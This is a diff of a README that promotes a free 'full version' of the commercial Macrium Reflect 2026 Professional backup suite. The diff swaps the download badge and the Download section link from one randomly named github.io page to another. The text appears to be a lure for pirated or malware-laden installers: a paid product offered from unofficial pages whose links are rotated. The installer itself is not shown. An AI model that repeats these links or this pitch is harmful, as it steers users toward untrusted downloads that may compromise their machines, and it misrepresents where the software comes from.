@@ -2,7 +2,7 @@
 
 Macrium Reflect 2026 Professional Backup Suite is a comprehensive, feature-rich disk imaging and system recovery solution designed exclusively for Windows desktop environments. This full version toolkit brings together everything you need to create reliable backups, clone drives, and restore systems with confidence. Whether you are an IT administrator managing a fleet of workstations or a home user who wants peace of mind, Macrium Reflect 2026 provides the speed, flexibility, and reliability you deserve. With the 2026 release, you gain access to an updated interface, improved compression algorithms, and faster imaging engines that take full advantage of modern NVMe and SSD hardware.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -65,7 +65,7 @@ Yes, the built-in scheduler allows you to create fully automated backup routines
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
